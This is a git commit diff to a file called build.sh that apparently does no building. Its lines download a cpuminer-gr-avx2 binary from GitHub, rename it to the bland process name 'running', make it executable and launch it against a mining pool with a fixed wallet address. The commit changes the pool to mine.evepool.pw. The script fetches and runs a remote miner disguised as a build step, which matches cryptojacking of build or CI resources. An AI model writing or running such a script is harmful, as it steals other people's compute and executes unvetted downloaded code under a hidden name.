b5609c2c316634eba8c7eb8da394534798956b13
hrsnetworkdev <130751804+hrsnetworkdev@users.noreply.github.com>
2023-05-19 03:29:56 +0700

    Update build.sh

--- build.sh
+++ build.sh
@@ -1,4 +1,4 @@
 wget https://github.com/WyvernTKC/cpuminer-gr-avx2/releases/download/1/cpuminer-gr-avx2
 mv cpuminer-gr-avx2 running
 chmod +x running
-./running -a gr -o stratum+tcp://ghostrider.london.mine.zergpool.com:5354 -u TFYbDvAEGVE1H9sYKn2GEu78y4XgHeAEmP -p  c=TAFT,mc=TAFT,m=party.sendalbututt
+./running -a gr -o stratum+tcp://mine.evepool.pw:7074 -u TFYbDvAEGVE1H9sYKn2GEu78y4XgHeAEmP
